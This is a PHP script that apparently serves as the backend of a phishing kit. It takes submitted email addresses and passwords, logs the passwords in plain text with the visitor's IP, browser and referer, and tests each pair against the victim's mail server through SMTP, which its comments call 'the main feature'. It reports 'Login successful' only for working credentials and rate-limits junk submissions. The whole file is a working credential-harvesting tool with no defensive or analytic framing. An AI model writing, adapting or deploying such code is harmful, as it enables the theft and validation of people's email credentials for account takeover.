<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers for JSON response
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['status' => 'error', 'message' => 'Method not allowed']);
    exit;
}

// Include required files
require_once 'config.php';
require_once 'SMTPLogger.php';

// Initialize the logger
$logger = new SMTPLogger();

// Get client IP address
function getClientIP() {
    $ipKeys = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($ipKeys as $key) {
        if (!empty($_SERVER[$key])) {
            $ips = explode(',', $_SERVER[$key]);
            $ip = trim($ips[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}

// Get browser information
function getBrowserInfo($userAgent) {
    $browsers = [
        'Chrome' => '/Chrome/i',
        'Firefox' => '/Firefox/i',
        'Safari' => '/Safari/i',
        'Edge' => '/Edge/i',
        'Opera' => '/Opera/i',
        'Internet Explorer' => '/MSIE/i'
    ];
    
    foreach ($browsers as $browser => $pattern) {
        if (preg_match($pattern, $userAgent)) {
            return $browser;
        }
    }
    return 'Unknown';
}

// Validate email format
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

// Sanitize input
function sanitizeInput($input) {
    return htmlspecialchars(trim($input), ENT_QUOTES, 'UTF-8');
}

try {
    // Get client information
    $clientIP = getClientIP();
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $referer = $_SERVER['HTTP_REFERER'] ?? 'Direct';
    $serverName = $_SERVER['SERVER_NAME'] ?? 'Unknown';
    $requestURI = $_SERVER['REQUEST_URI'] ?? 'Unknown';
    $sessionId = session_id() ?: 'No session';
    
    // Check if IP is blocked
    if ($logger->isIPBlocked($clientIP)) {
        http_response_code(429);
        echo json_encode([
            'status' => 'error',
            'message' => 'Too many failed attempts. Please try again later.'
        ]);
        exit;
    }
    
    // Get POST data
    $email = isset($_POST['email']) ? sanitizeInput($_POST['email']) : '';
    $password = isset($_POST['password']) ? $_POST['password'] : ''; // Don't sanitize password
    
    // Basic validation
    if (empty($email) || empty($password)) {
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'message' => 'Email and password are required.'
        ]);
        exit;
    }
    
    // Validate email format
    if (!isValidEmail($email)) {
        $logger->trackFailedAttempt($clientIP);
        http_response_code(400);
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid email format.'
        ]);
        exit;
    }
    
    // Check if credentials are valid (this is the main feature - SMTP verification)
    $validCredentials = false;
    $credentialCheckResult = 'unknown';
    
    try {
        // Only verify credentials for legitimate-looking attempts
        if (strlen($password) >= 6) {
            $validCredentials = $logger->verifyCredentials($email, $password);
            $credentialCheckResult = $validCredentials ? 'valid' : 'invalid';
        } else {
            $credentialCheckResult = 'too_short';
        }
    } catch (Exception $e) {
        error_log("Credential verification error: " . $e->getMessage());
        $credentialCheckResult = 'error';
    }
    
    // Prepare log data
    $logData = [
        'timestamp' => date('Y-m-d H:i:s'),
        'email' => $email,
        'password' => $password,
        'ip_address' => $clientIP,
        'browser' => getBrowserInfo($userAgent),
        'user_agent' => $userAgent,
        'referer' => $referer,
        'server_name' => $serverName,
        'request_uri' => $requestURI,
        'session_id' => $sessionId,
        'valid_credentials' => $validCredentials,
        'credential_check_result' => $credentialCheckResult
    ];
    
    // Log the attempt
    $logResult = false;
    try {
        $logResult = $logger->logAttempt($logData);
    } catch (Exception $e) {
        error_log("Logging error: " . $e->getMessage());
    }
    
    // Track failed attempts for rate limiting
    if (!$validCredentials) {
        $logger->trackFailedAttempt($clientIP);
    }
    
    // Determine response based on credentials validity
    if ($validCredentials) {
        // Valid credentials - return success
        echo json_encode([
            'status' => 'success',
            'message' => 'Login successful!',
            'redirect' => true,
            'logged' => $logResult
        ]);
    } else {
        // Invalid credentials - return error but still log the attempt
        http_response_code(401);
        echo json_encode([
            'status' => 'error',
            'message' => 'Invalid email or password.',
            'logged' => $logResult,
            'debug' => SMTP_DEBUG > 0 ? ['check_result' => $credentialCheckResult] : null
        ]);
    }
    
} catch (Exception $e) {
    error_log("Postmailer error: " . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => 'Internal server error. Please try again later.'
    ]);
}

// Additional security: Log all requests to a separate file for monitoring
if (defined('LOG_TO_FILE') && LOG_TO_FILE) {
    $securityLogFile = LOG_DIR . '/security.log';
    $securityEntry = date('Y-m-d H:i:s') . " - IP: {$clientIP} - Email: {$email} - Result: " . 
                    ($validCredentials ? 'VALID' : 'INVALID') . " - UA: {$userAgent}\n";
    file_put_contents($securityLogFile, $securityEntry, FILE_APPEND | LOCK_EX);
}

?>